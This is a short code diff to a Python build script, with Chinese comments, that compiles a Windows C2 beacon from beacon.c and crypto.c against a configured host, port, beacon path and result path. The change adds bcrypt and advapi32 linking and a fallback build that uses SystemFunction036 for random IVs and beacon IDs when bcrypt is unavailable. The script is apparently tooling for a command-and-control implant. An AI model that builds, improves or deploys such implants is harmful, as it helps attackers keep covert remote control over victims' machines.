@@ -49,12 +49,21 @@ def main(argv: list[str] | None = None) -> None:
         f"-DC2_TLS_VERIFY={args.tls_verify}",
         "-o", args.out,
         str(HERE / "beacon.c"), str(HERE / "crypto.c"),
-        "-lws2_32", "-lwinhttp",
+        # bcrypt: BCryptGenRandom（IV/beacon id）；advapi32: SystemFunction036 兜底
+        "-lws2_32", "-lwinhttp", "-lbcrypt", "-ladvapi32",
     ]
     proc = subprocess.run(cc, capture_output=True, text=True, encoding="utf-8", errors="replace")
     if proc.returncode != 0:
-        sys.stderr.write(proc.stdout + proc.stderr)
-        raise SystemExit(f"构建失败（exit={proc.returncode}）")
+        # 构建链不支持 bcrypt.lib 时退 SystemFunction036（RtlGenRandom，advapi32）
+        d_index = cc.index("-o")
+        fallback = cc[:d_index] + ["-DCMT1_NO_BCRYPT"] + cc[d_index:]
+        fallback.remove("-lbcrypt")
+        proc = subprocess.run(fallback, capture_output=True, text=True,
+                              encoding="utf-8", errors="replace")
+        if proc.returncode != 0:
+            sys.stderr.write(proc.stdout + proc.stderr)
+            raise SystemExit(f"构建失败（exit={proc.returncode}）")
+        print("注意: bcrypt.lib 不可用，已退 SystemFunction036（CMT1_NO_BCRYPT）")
     print(f"built {args.out} -> {args.host}:{args.port}（beacon {args.path_beacon} / result {args.path_result}）")
 
 
